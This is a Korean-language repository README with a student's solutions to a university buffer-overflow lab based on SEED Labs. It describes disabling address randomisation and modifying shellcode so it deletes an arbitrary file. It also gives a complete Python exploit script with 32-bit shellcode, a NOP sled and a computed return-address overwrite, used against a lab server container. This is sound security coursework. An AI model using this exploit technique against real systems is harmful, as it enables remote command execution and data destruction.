# EEC4412 Buffer-Overflow Attack Lab

2025년 2학기 인하대학교 전기전자공학부 <a href="https://abeek.inha.ac.kr/01_prof/01_portfolio/PlanPrintInfo.aspx?CurrSeq=155546&ViewState=N">EEC4412 정보보호론</a> 수업의 Buffer-Overflow Attack Lab 과제의 풀이가 담긴 저장소입니다.
<br><br>
온라인에 공개된 "<a href="https://seedsecuritylabs.org/Labs_20.04/Files/Buffer_Overflow_Server/Buffer_Overflow_Server.pdf">SEED Labs - Buffer Overflow Attack Lab (Server Version)</a>" 문제를 일부 변형하여 출제되었습니다. 실습 환경 코드는 <a href="https://seedsecuritylabs.org/Labs_20.04/Files/Buffer_Overflow_Server/Labsetup.zip">이 링크</a>에 방문하면 볼 수 있습니다.
<br><br>
실습은 Google Cloud Compute Engine e2-small x86_64, Ubuntu 20.04를 사용하여 진행되었습니다.

## Lab 환경 설정
본 실습 시작 전에 Address randomization countermeasure를 비활성화 해주었습니다. 이를 비활성화 하지 않으면 버퍼 오버플로우 공격을 하기 어렵기 때문에 과제에서 비활성화 할 것을 요구하고 있습니다.<br>
`$ sudo /sbin/sysctl -w kernel.randomize_va_space=0`
<img width="896" height="74" alt="image" src="https://github.com/user-attachments/assets/15111aa6-c6da-4922-9c27-8b18818f352c" />
<br>
공격 대상 서버는 docker-compose.yml 파일을 통해 제공되고 있습니다. 이를 이용해 컨테이너를 띄워줬습니다.
<img width="958" height="403" alt="image" src="https://github.com/user-attachments/assets/99a93f47-b894-4592-ac0c-31472c90ce0f" />

## Task 1: Shellcode 익히기
> Task 1 (2점). 임의의 파일을 삭제할 수 있도록 쉘 코드를 변경하라. 수정한 코드의 스크린샷을 리포트에 첨부하라.
- 풀이 코드
  - <a href="https://github.com/Yun-YeoJun/EEC4412-Buffer-Overflow-Attack-Lab/blob/main/shellcode/shellcode_32.py">shellcode/shellcode_32.py</a>
<br>
변경 전 원본 shellcode/shellcode_32.py의 모습은 아래와 같습니다.<br><br>
<img width="953" height="875" alt="image" src="https://github.com/user-attachments/assets/93b8a309-1c8d-4d99-9f34-7467a492c6db" />
<br><br>
여기서 "/bin/ls -l; echo hello 32; /bin/tail -n 2 /etc/passwd      *" 부분을 변경해주면 원하는 명령이 실행되도록 만들 수 있습니다.
<br><br>
그래서 아래와 같이 수정해 주었습니다. 매개변수로 target 파일 주소를 받고, 이를 삭제하는 명령을 변수 cmd에 담았습니다. 그리고 shellcode 변수에 cmd 변수의 값을 넣어줬습니다.<br><br>
<img width="750" height="659" alt="image" src="https://github.com/user-attachments/assets/472e0c48-fd5d-4d9f-82e0-6e5ce3b2869f" />
<br><br>
실행 결과는 아래와 같습니다. shellcode 바이너리를 생성하기 위해 `./shellcode_32.py`를 실행하면서 'test'를 매개변수로 넣어줬습니다. 정상적으로 삭제 명령이 동작함을 확인하기 위해 'test' 파일을 `touch test`로 만들어주고, './a32.out'을 실행해 보았습니다. 이를 실행하니 'test' 이름을 가진 파일이 삭제되었음을 확인할 수 있습니다.<br><br>
<img width="934" height="713" alt="image" src="https://github.com/user-attachments/assets/48ba1108-7e48-41d4-b114-15de5fd133ab" />

## Task 2: Level-1 공격
> Task 2 (10점). exploit.py를 이용하여 Server 1을 공격하라. 공격에 사용한 코드를 제시하고 설명해라. 어떠한 쉘 코드를 수행하였는지 설명하고, 이에 대한 증명을 스크린샷으로 보고서에 첨부하라.
- 풀이 코드
  - <a href="https://github.com/Yun-YeoJun/EEC4412-Buffer-Overflow-Attack-Lab/blob/main/attack-code/exploit.py">attack-code/exploit.py</a>
<br>
Server 1에 정상적으로 요청을 보내면 다음과 같은 로그가 컨테이너에 남습니다.<br><br>
<img width="1040" height="384" alt="image" src="https://github.com/user-attachments/assets/cbc9698a-5726-4d65-af0b-4e79082b9c72" />
<br><br>
서버의 프로그램이 정상적으로 반환되면 "Returned Properly"라는 메시지가 출력됩니다. 만약 이 메시지가 출력되지 않는다면, stack 프로그램이 크래시된 것이라고 생각할 수 있습니다.<br><br>

위 컨테이너 로그를 보면 버퍼 오버플로우 공격에 핵심적인 두 가지 정보를 확인할 수 있습니다. Frame pointer의 값과 버퍼의 주소를 확인할 수 있습니다. 위 스크린샷에서는 ebp는 '0xffffd5b8', 버퍼 주소는 '0xffffd548'임을 확인할 수 있습니다. 여기서 ebp는 x86 아키텍처에서 frame pointer register를 가리키는 이름입니다. x64 아키텍처에서는 rbp라고 합니다.<br><br>

이러한 정보를 바탕으로 아래와 같이 공격 코드를 작성해줬습니다. (attack-code/exploit.py)<br><br>
```python
#!/usr/bin/python3
import sys

cmd = f"/bin/echo EXPLOIT!; /bin/ls -alR;                         *"

shellcode = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # You can modify the following command string to run any command.
   # You can even run multiple commands. When you change the string,
   # make sure that the position of the * at the end doesn't change.
   # The code above will change the byte at this position to zero,
   # so the command string ends here.
   # You can delete/add spaces, if needed, to keep the position the same. 
   # The * in this line serves as the position marker         * 
   +cmd+
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload

buf = 0xffffd548
ebp = 0xffffd5b8

ret    = buf + start     # Change this number 
offset = ebp + 4 - buf  # Change this number 

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```
<br>
공격 페이로드에 넣은 쉘 코드는 이전 문제에서 사용한 쉘 코드를 가져와서 일부 변형했습니다. 만약 공격이 성공했을 경우 서버에 echo 명령어와 ls 명령어가 실행되도록 설정해 주었습니다. 공격자가 원하는 다른 명령어를 적어줘도 됩니다.<br><br>
start 변수의 값은 입력의 최대 길이가 517이므로, 거기서 shellcode 변수의 길이 만큼을 뺀 값으로 설정해 줬습니다. 이는 페이로드의 맨 끝에 쉘 코드를 배치하려고 했기 때문입니다.<br><br>
offset 변수를 보면 ebp + 4 - buf로 설정해주고 있는 것을 볼 수 있습니다. 서버에서는 buf 주소부터 데이터를 복사하기 때문에 content 에서 0번 인덱스는 buf 주소를 가리킵니다. 그래서 ebp + 4 주소는 content 에서 ebp + 4 - buf 인덱스를 가집니다. offset 값을 이렇게 설정해주고 이 위치에 ret 값을 넣어주면, 정확히 return address에 우리가 실행하기를 원하는 쉘 코드의 주소 buf + start를 덮어쓸 수 있습니다.<br><br>

실행 결과는 아래와 같습니다. 컨테이너의 로그를 보면 "EXPLOIT!"이라는 문자열과 `ls -alR` 명령어의 결과가 잘 뜨는 것을 확인할 수 있습니다. 즉, 공격자가 원하는 명령어가 실행되었음을 확인할 수 있습니다.<br><br>
<img width="1215" height="639" alt="image" src="https://github.com/user-attachments/assets/1756ccf9-37c9-465c-bbb5-6407a6998596" />

